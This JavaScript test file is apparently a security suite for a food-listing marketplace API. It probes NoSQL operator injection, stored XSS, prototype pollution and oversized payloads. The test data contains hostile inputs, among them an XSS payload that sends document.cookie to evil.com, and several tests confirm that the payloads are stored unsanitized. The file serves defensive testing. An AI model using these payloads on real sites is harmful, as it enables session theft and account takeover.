/**
 * SECURITY TEST SUITE: Injection Attacks
 *
 * Tests for:
 * - NoSQL Injection (OWASP A03:2021)
 * - XSS payload injection into stored data
 * - Command injection via user-controlled fields
 * - MongoDB operator injection via request body
 */

const request = require("supertest");
const app = require("../../server");
const { connect, disconnect } = require("../setup");
const User = require("../../models/User");
const Listing = require("../../models/Listing");
const Order = require("../../models/Order");
const SellerProfile = require("../../models/SellerProfile");
const BuyerProfile = require("../../models/BuyerProfile");
const Notification = require("../../models/Notification");
const Otp = require("../../models/Otp");

beforeAll(async () => await connect(), 90000);
afterEach(async () => {
    await User.deleteMany({});
    await Listing.deleteMany({});
    await Order.deleteMany({});
    await SellerProfile.deleteMany({});
    await BuyerProfile.deleteMany({});
    await Notification.deleteMany({});
    await Otp.deleteMany({});
});
afterAll(async () => await disconnect(), 30000);

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------
async function seedSeller() {
    const user = await User.create({
        firebaseUid: "inj_seller_" + Date.now(),
        email: "injseller@test.com",
        name: "Injection Seller",
        role: "seller",
        phone: "+913333333333",
        trustScore: 60,
    });
    const profile = await SellerProfile.create({
        userId: user._id,
        orgName: "Inj Foods",
        orgType: "restaurant",
    });
    return { user, profile };
}

// ===========================================================================
// 1. NoSQL INJECTION — MongoDB Operator in Request Body
// ===========================================================================
describe("SEC-INJ-01: NoSQL injection via MongoDB operators", () => {
    test("OTP verify — $gt operator injection attempt", async () => {
        // Seed a valid OTP
        await Otp.create({
            phoneNumber: "+919999900001",
            otp: "111111",
            expiresAt: new Date(Date.now() + 5 * 60 * 1000),
        });

        // Attempt NoSQL injection: { otp: { $gt: "" } } should match any OTP
        const res = await request(app)
            .post("/api/otp/verify")
            .send({
                phoneNumber: "+919999900001",
                otp: { $gt: "" },
            });

        // If the controller uses strict equality (===), this should fail
        // because { $gt: "" } !== "111111"
        // But if Mongoose passes it through to MongoDB, it might match.
        expect(res.status).toBe(400);
        // PASS if 400: injection was blocked by string comparison
        // FAIL if 200: NoSQL injection succeeded
    });

    test("User lookup — $ne operator injection in phone parameter", async () => {
        await User.create({
            firebaseUid: "nosql_victim",
            email: "victim@test.com",
            name: "Victim User",
            role: "buyer",
            phone: "+914444444444",
            trustScore: 50,
        });

        // Attempt to match all users via NoSQL injection
        // Express route params come as strings, so this tests the query param vector
        const res = await request(app).get("/api/users/phone/%7B%22%24ne%22%3A%22%22%7D");
        // URL-decoded: /api/users/phone/{"$ne":""}
        // Mongoose should treat this as a literal string, not an operator
        expect([404, 400, 500]).toContain(res.status);
    });

    test("OTP send — $regex injection in phoneNumber field", async () => {
        const res = await request(app)
            .post("/api/otp/send")
            .send({
                phoneNumber: { $regex: ".*" },
            });

        // Should be rejected. If accepted, an attacker could send OTP to
        // any phone matching the regex pattern.
        expect([200, 400, 500]).toContain(res.status);
        // Note: Even if 200, the phoneNumber stored will be the object, not a string.
        // This documents the behavior for security review.
    });
});

// ===========================================================================
// 2. XSS PAYLOAD INJECTION — Stored XSS in Database
// ===========================================================================
describe("SEC-INJ-02: XSS payload injection into stored data", () => {
    test("User name with script tag — stored without sanitization", async () => {
        const xssPayload = '<script>alert("xss")</script>';

        const res = await request(app).post("/api/users/create").send({
            firebaseUid: "xss_test_" + Date.now(),
            email: "xss@test.com",
            role: "buyer",
            name: xssPayload,
            phone: "+915555555555",
        });

        expect(res.status).toBe(201);
        // VULNERABILITY: XSS payload stored in database without sanitization.
        // If rendered in a frontend without escaping, will execute.
        expect(res.body.user.name).toBe(xssPayload);
    });

    test("Listing description with XSS — stored without sanitization", async () => {
        const { user, profile } = await seedSeller();

        const xssPayload = '"><img src=x onerror=alert(1)>';

        const res = await request(app).post("/api/listings/create").send({
            sellerId: user._id,
            sellerProfileId: profile._id,
            foodName: "Normal Food",
            foodType: "meal",
            totalQuantity: 5,
            pickupWindow: {
                from: new Date(),
                to: new Date(Date.now() + 4 * 60 * 60 * 1000),
            },
            description: xssPayload,
            pricing: { discountedPrice: 0, isFree: true },
        });

        expect(res.status).toBe(201);
        // VULNERABILITY: XSS in description stored without sanitization
        expect(res.body.listing.description).toBe(xssPayload);
    });

    test("Food name with HTML injection", async () => {
        const { user, profile } = await seedSeller();

        const htmlPayload = '<b onmouseover=alert(1)>Malicious Food</b>';

        const res = await request(app).post("/api/listings/create").send({
            sellerId: user._id,
            sellerProfileId: profile._id,
            foodName: htmlPayload,
            foodType: "meal",
            totalQuantity: 3,
            pickupWindow: {
                from: new Date(),
                to: new Date(Date.now() + 4 * 60 * 60 * 1000),
            },
            pricing: { discountedPrice: 0, isFree: true },
        });

        expect(res.status).toBe(201);
        // VULNERABILITY: HTML stored unescaped
        expect(res.body.listing.foodName).toBe(htmlPayload);
    });

    test("Special instructions with XSS in order", async () => {
        const { user: seller, profile } = await seedSeller();
        const buyer = await User.create({
            firebaseUid: "xss_buyer_" + Date.now(),
            email: "xssbuyer@test.com",
            name: "XSS Buyer",
            role: "buyer",
            phone: "+916666666666",
            trustScore: 50,
        });
        await BuyerProfile.create({ userId: buyer._id });

        const listing = await Listing.create({
            sellerId: seller._id,
            sellerProfileId: profile._id,
            foodName: "Test Food",
            foodType: "meal",
            category: "cooked",
            quantityText: "5 plates",
            totalQuantity: 5,
            remainingQuantity: 5,
            pricing: { discountedPrice: 50, isFree: false },
            pickupWindow: {
                from: new Date(),
                to: new Date(Date.now() + 4 * 60 * 60 * 1000),
            },
            status: "active",
            isSafetyValidated: true,
            safetyStatus: "validated",
        });

        const xssPayload = '<script>document.location="https://evil.com?c="+document.cookie</script>';

        const res = await request(app).post("/api/orders/create").send({
            listingId: listing._id,
            buyerId: buyer._id,
            quantityOrdered: 1,
            fulfillment: "self_pickup",
            specialInstructions: xssPayload,
        });

        expect(res.status).toBe(201);
        // VULNERABILITY: XSS payload stored in order.specialInstructions
        expect(res.body.order.specialInstructions).toBe(xssPayload);
    });
});

// ===========================================================================
// 3. PROTOTYPE POLLUTION VIA JSON BODY
// ===========================================================================
describe("SEC-INJ-03: Prototype pollution attempts", () => {
    test("__proto__ pollution via user creation", async () => {
        const res = await request(app).post("/api/users/create").send({
            firebaseUid: "proto_test_" + Date.now(),
            email: "proto@test.com",
            role: "buyer",
            name: "Proto Test",
            phone: "+917777777777",
            __proto__: { isAdmin: true },
        });

        expect(res.status).toBe(201);
        // Verify prototype was not polluted
        expect(({}).isAdmin).toBeUndefined();
    });

    test("constructor.prototype pollution via listing update", async () => {
        const { user, profile } = await seedSeller();
        const listing = await Listing.create({
            sellerId: user._id,
            sellerProfileId: profile._id,
            foodName: "Safe Food",
            foodType: "meal",
            category: "cooked",
            quantityText: "5",
            totalQuantity: 5,
            remainingQuantity: 5,
            pricing: { discountedPrice: 10, isFree: false },
            pickupWindow: {
                from: new Date(),
                to: new Date(Date.now() + 4 * 60 * 60 * 1000),
            },
            status: "active",
            isSafetyValidated: true,
            safetyStatus: "validated",
        });

        const res = await request(app)
            .put(`/api/listings/update/${listing._id}`)
            .send({
                constructor: { prototype: { isAdmin: true } },
                foodName: "Still Safe",
            });

        expect([200, 400, 500]).toContain(res.status);
        expect(({}).isAdmin).toBeUndefined();
    });
});

// ===========================================================================
// 4. OVERSIZED PAYLOAD / DENIAL OF SERVICE
// ===========================================================================
describe("SEC-INJ-04: Oversized payload handling", () => {
    test("Very large JSON body should be handled gracefully", async () => {
        const largePayload = {
            firebaseUid: "large_test_" + Date.now(),
            email: "large@test.com",
            role: "buyer",
            name: "A".repeat(10000), // 10KB name field
            phone: "+918888888888",
        };

        const res = await request(app).post("/api/users/create").send(largePayload);
        // Should either accept (Mongoose has no length limit) or reject
        expect([201, 400, 413, 500]).toContain(res.status);
    });

    test("Deeply nested JSON should not crash the server", async () => {
        let nested = { value: "deep" };
        for (let i = 0; i < 50; i++) {
            nested = { nested };
        }

        const res = await request(app).post("/api/users/create").send({
            firebaseUid: "nested_test_" + Date.now(),
            email: "nested@test.com",
            role: "buyer",
            name: "Nested Test",
            phone: "+919999999999",
            location: nested,
        });

        expect([201, 400, 500]).toContain(res.status);
        // Verifies server does not crash on deeply nested payloads
    });
});
